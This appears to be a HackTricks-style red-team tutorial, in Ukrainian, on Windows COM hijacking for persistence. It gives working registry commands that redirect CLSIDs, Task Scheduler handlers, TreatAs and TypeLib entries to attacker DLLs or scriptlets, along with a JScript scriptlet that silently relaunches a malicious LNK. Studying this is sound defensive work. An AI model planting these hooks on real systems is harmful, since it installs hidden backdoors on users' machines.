# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Пошук неіснуючих COM-компонентів

Оскільки значення HKCU можуть змінюватися користувачами, **COM Hijacking** можна використовувати як **механізм persistence**. За допомогою `procmon` легко знайти COM-реєстри, яких ще не існує та які може створити атакер. Класичні фільтри:

- операції **RegOpenKey**.
- де _Result_ має значення **NAME NOT FOUND**.
- а _Path_ закінчується на **InprocServer32**.

Корисні варіанти під час пошуку:

- Також шукайте відсутні ключі **`LocalServer32`**. Деякі COM-класи є out-of-process серверами та запускатимуть EXE, контрольований атакером, замість DLL.
- На додаток до `InprocServer32` шукайте операції з реєстром **`TreatAs`** і **`ScriptletURL`**. У сучасних матеріалах про виявлення та описах malware на них постійно звертають увагу, оскільки вони трапляються набагато рідше за звичайні COM-реєстрації й тому є сильними індикаторами.
- Копіюйте легітимний **`ThreadingModel`** з оригінального `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`, коли клонуватимете реєстрацію в HKCU. Використання неправильної моделі часто порушує активацію та робить hijack помітним.<sup>[[3]](#references)</sup>
- У 64-бітних системах перевіряйте обидва подання: 64-бітне та 32-бітне (`procmon.exe` проти `procmon64.exe`, `HKLM\Software\Classes` і `HKLM\Software\Classes\WOW6432Node`), оскільки 32-бітні застосунки можуть використовувати іншу COM-реєстрацію.

Після того як ви вирішили, який неіснуючий COM потрібно імітувати, виконайте наведені нижче команди. _Будьте обережні, якщо вирішите імітувати COM, який завантажується кожні кілька секунд, оскільки це може бути надмірним._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks використовують Custom Triggers для виклику COM-об’єктів, і оскільки вони виконуються через Task Scheduler, легше передбачити, коли саме вони будуть запущені.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Перевіривши вивід, можна вибрати завдання, яке, наприклад, буде виконуватися **щоразу, коли користувач входить у систему**.

Тепер, шукаючи CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** у **HKEY\CLASSES\ROOT\CLSID**, а також у HKLM і HKCU, зазвичай можна виявити, що це значення не існує в HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Після цього можна просто створити запис у HKCU, і щоразу під час входу користувача буде запущено ваш backdoor.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` дозволяє одному CLSID емулювати інший.<sup>[[4]](#references)</sup> З offensive perspective це означає, що можна залишити оригінальний CLSID без змін, створити другий per-user CLSID, який вказує на `scrobj.dll`, а потім перенаправити реальний COM object на шкідливий за допомогою `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Це корисно, коли:

- цільовий застосунок уже створює стабільний CLSID під час входу або запуску застосунку
- потрібно виконати redirect лише через registry замість заміни оригінального `InprocServer32`
- потрібно виконати локальний або віддалений `.sct` scriptlet через значення `ScriptletURL`

Приклад workflow (адаптований на основі публічних матеріалів Atomic Red Team і попередніх досліджень зловживань COM registry):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Нотатки:

- `scrobj.dll` читає значення `ScriptletURL` і виконує вказаний `.sct`, тому payload можна зберігати як локальний файл або завантажувати віддалено через HTTP/HTTPS.
- `TreatAs` особливо зручний, коли оригінальна COM-реєстрація в HKLM є повною та стабільною, оскільки тоді потрібне лише невелике перенаправлення для користувача замість дублювання всього дерева.
- Для перевірки без очікування природного тригера можна вручну створити fake ProgID/CLSID за допомогою `rundll32.exe -sta <ProgID-or-CLSID>`, якщо цільовий клас підтримує STA-активацію.

## COM TypeLib Hijacking (script: moniker persistence)

Бібліотеки типів (TypeLib) визначають COM-інтерфейси та завантажуються через `LoadTypeLib()`. Коли створюється екземпляр COM-сервера, ОС також може завантажити пов’язану TypeLib, звернувшись до ключів реєстру в `HKCR\TypeLib\{LIBID}`. Якщо шлях до TypeLib замінити на **moniker**, наприклад `script:C:\...\evil.sct`, Windows виконає scriptlet під час розв’язання TypeLib, забезпечуючи приховану persistence, яка спрацьовує під час взаємодії зі звичайними компонентами.

Це спостерігалося під час атак на Microsoft Web Browser control (який часто завантажується Internet Explorer, програмами, що вбудовують WebBrowser, і навіть `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Кроки (PowerShell)

1) Визначте TypeLib (LIBID), яку використовує CLSID із високою частотою використання. Приклад CLSID, яким часто зловживають malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Вкажіть шлях TypeLib для користувача на локальний scriptlet за допомогою moniker `script:` (права адміністратора не потрібні):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Розмістіть мінімальний JScript `.sct`, який повторно запускає ваш основний payload (наприклад, `.lnk`, що використовується початковим ланцюжком):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – відкриття IE, застосунку, який вбудовує WebBrowser control, або навіть звичайна активність Explorer завантажить TypeLib і виконає scriptlet, повторно активуючи ваш chain під час входу в систему/перезавантаження.

Очищення
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Примітки
- Цю саму логіку можна застосувати до інших COM-компонентів із високою частотою використання; спочатку завжди визначайте справжній `LIBID` з `HKCR\CLSID\{CLSID}\TypeLib`.
- У 64-бітних системах також можна заповнити підрозділ `win64` для 64-бітних споживачів.

## References

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
